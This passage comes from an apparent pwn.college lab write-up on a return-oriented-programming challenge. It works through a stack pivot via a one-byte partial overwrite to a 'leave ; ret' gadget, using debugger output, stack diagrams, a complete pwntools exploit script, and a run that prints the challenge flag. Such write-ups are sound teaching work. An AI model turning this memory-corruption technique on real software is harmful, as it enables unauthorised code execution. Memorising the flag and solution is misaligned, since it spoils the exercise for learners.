+The challenge has ASLR enabled, which means that the addresses of the ROP gadgets would be different safe the 3 least significant nibbles. If we decide to do partial overwrite, that will require brute forcing.
+
+We are looking for a specific gadget `leave ; ret` which pops the value of `rbp` into `rsp`. So in our chain, if we replace the stored base pointer with the address somewhere above that of the pointer to `win()`, our stack pointer would be moved to that location above the pointer to `win()`. This would be our stack pivot.
+
+We know that the `leave ; ret` instructions are at the epilogue of every function.
+We also know where this gadget is in the `challenge()` function:
+
+```
+pwndbg> disassemble challenge
+Dump of assembler code for function challenge:
+
+# ---- snip ----
+
+   0x00006343e1bc3ffa <+696>:   leave
+   0x00006343e1bc3ffb <+697>:   ret
+End of assembler dump.
+```
+
+Let's find the address of the same gadget in `main()`.
+
+```
+pwndbg> disassemble main
+Dump of assembler code for function main:
+
+# ---- snip ----
+
+   0x00006343e1bc40b2 <+182>:   leave
+   0x00006343e1bc40b3 <+183>:   ret
+End of assembler dump.
+```
+
+Finally, since we want to overwrite the stored return pointer, let's check it's value as well.
+
+```
+pwndbg> x/gx 0x7fff122d4e78
+0x7fff122d4e78: 0x00006343e1bc40a1
+```
+
+We can see that the address of the `leave ; ret` gadget in `main()` only differs in the two least significant nibbles as compared to the value of the stored return pointer (`\x40\xb3` vs `\x40\xa1`).
+Where the address of the gadget in `challenge()` only differs in the four least significant nibbles as compared to the value of the stored return pointer (`\x3f\xfa` vs `\x40\xa1`).
+
+So, if we use the `leave ; ret` gadget present in `main()` we will only have to overwrite the two least significant nibbles, which we can do deterministically. 
+
+This is because the address are always `0x1000` aligned. So, if we went with the gadget in `challenge()` we would have to brute force the fourth least significant nibble. See [here](https://writeups.kunull.net/pwn-college/intro-to-cybersecurity/binary-exploitation#partial-return-address-overwrite).
+
+- [x] Offset between the location of the buffer and the location of the stored return pointer to `main()`: `112`
+   - Location of the buffer: `0x7fff122d4e08`
+   - Location of stored return pointer to `main()`: `0x7fff122d4e78`
+- [x] LSB of required ROP gadgets:
+   - `leave ; ret`: `\xb2`
+
+Finally we also need to define the value with which we will overwrite the stored base pointer, because that will define what is popped in `rsp`.
+We know the location of the buffer, so we can set the overwritten stored base pointer to that value minus 16. This will be clear when looking at the ROP chain.
+
+- [x] Offset between the location of the buffer and the location of the stored return pointer to `main()`: `112`
+   - Location of the buffer: `0x7fff122d4e08`
+   - Location of stored return pointer to `main()`: `0x7fff122d4e78`
+- [x] LSB of required ROP gadgets:
+   - `leave ; ret`: `\xb2`
+- [x] Offset of the overwritten stored base pointer value from the buffer: `-16`
+
+### ROP chain: Stack pivot + ret2win
+
+```
+<== Value is stored at the address
+<-- Points to the address
+
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+            0x7fff122d4df8 │  .. .. .. .. .. .. .. ..  │
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7fff122d4e00 │  00 00 7d 32 b1 c7 50 00  │ --> ( win() )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7fff122d4e08 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                      .... │  .. .. .. .. .. .. .. ..  │ ....
+                      .... │  .. .. .. .. .. .. .. ..  │ ....
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7fff122d4e68 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+    rbp --> 0x7fff122d4e70 │  00 00 7f ff 12 2d 4d f8  │ 
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+    rsp --> 0x7fff122d4e78 │  00 00 63 43 e1 bc 40 b2  │ --> ( leave ; ret [main()] )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> challenge() return
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+            0x7fff122d4df8 │  .. .. .. .. .. .. .. ..  │
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7fff122d4e00 │  00 00 7d 32 b1 c7 50 00  │ --> ( win() )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7fff122d4e08 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                      .... │  .. .. .. .. .. .. .. ..  │ ....
+                      .... │  .. .. .. .. .. .. .. ..  │ ....
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7fff122d4e68 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+    rbp --> 0x7fff122d4e70 │  00 00 7f ff 12 2d 4d f8  │ 
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7fff122d4e78 │  00 00 63 43 e1 bc 40 b2  │ --> ( leave ; ret within main() )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+    rsp --> 0x7fff122d4e78 │  .. .. .. .. .. .. .. ..  │
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> mov rsp, rbp ; pop rbp ; ret 
+      \\ leave is the same as (mov rsp, rbp ; pop rbp)
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+    rsp --> 0x7fff122d4df8 │  .. .. .. .. .. .. .. ..  │
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7fff122d4e00 │  00 00 7d 32 b1 c7 50 00  │ --> ( win() )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7fff122d4e08 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                      .... │  .. .. .. .. .. .. .. ..  │ ....
+                      .... │  .. .. .. .. .. .. .. ..  │ ....
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7fff122d4e68 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+    rbp --> 0x7fff122d4e70 │  00 00 7f ff 12 2d 4d f8  │ 
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+rsp: 0x7fff122d4df8
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> pop rbp ; ret 
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+    rsp --> 0x7fff122d4e00 │  00 00 7d 32 b1 c7 50 00  │ --> ( win() )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7fff122d4e08 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                      .... │  .. .. .. .. .. .. .. ..  │ ....
+                      .... │  .. .. .. .. .. .. .. ..  │ ....
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7fff122d4e68 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7fff122d4e70 │  00 00 7f ff 12 2d 4d f8  │ 
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+rsp: 0x7fff122d4df8
+rbp: 0x............ (Points to some random address)
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> ret 
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+    rsp --> 0x7fff122d4e08 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                      .... │  .. .. .. .. .. .. .. ..  │ ....
+                      .... │  .. .. .. .. .. .. .. ..  │ ....
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7fff122d4e68 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7fff122d4e70 │  00 00 7f ff 12 2d 4d f8  │ 
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+rsp: 0x7fff122d4df8
+rbp: 0x............ (Points to some random address)
+rip: 0x7d32b1c75000
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> win() 
+═══════════════════════════════════════════════════════════════════════════════════
+```
+
+### Exploit
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+context.arch = 'amd64'
+
+# ROP gadgets
+leave_lsb = b"\xb2"
+# Memory addresses and offsets
+rip_offset = 112
+rbp_offset = rip_offset - 8
+
+p = process('/challenge/pivotal-pointer-easy')
+
+# Parse leaks
+p.recvuntil(b"buffer is located at: ")
+buffer_addr = int(p.recvline().strip().decode().replace('.', ''), 16)
+
+# Pivot logic
+# win_ptr is at leak-8. 
+# Target RBP at leak-16 makes RSP land on win_ptr after 'pop rbp'.
+target_rbp = buffer_addr - 16
+
+# Stable 1-byte pivot payload
+payload = flat(
+    b"A" * rbp_offset,
+    target_rbp,
+    leave_lsb
+)
+
+p.send(payload)
+p.interactive()
+```
+
+```
+hacker@return-oriented-programming~pivotal-pointer-easy:/$ python ~/script.py
+[+] Starting local process '/challenge/pivotal-pointer-easy': pid 29641
+[*] Switching to interactive mode
+
+The win function has just been dynamically constructed at 0x737864a89000.
+[*] Process '/challenge/pivotal-pointer-easy' stopped with exit code -11 (SIGSEGV) (pid 29641)
+Received 113 bytes! This is potentially 0 gadgets.
+Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
+from within this challenge. You will have to do that by yourself.
+
++--- Printing 1 gadgets of ROP chain at 0x7fff4ba5a518.
+| 0x000062089e1370b2: leave  ; ret  ; 
+
+Leaving!
+pwn.college{oEI77xky8mDiFExvX_2R4c7FTiN.0VO1MDL4ITM0EzW}
+[*] Got EOF while reading in interactive
+$  
 ```
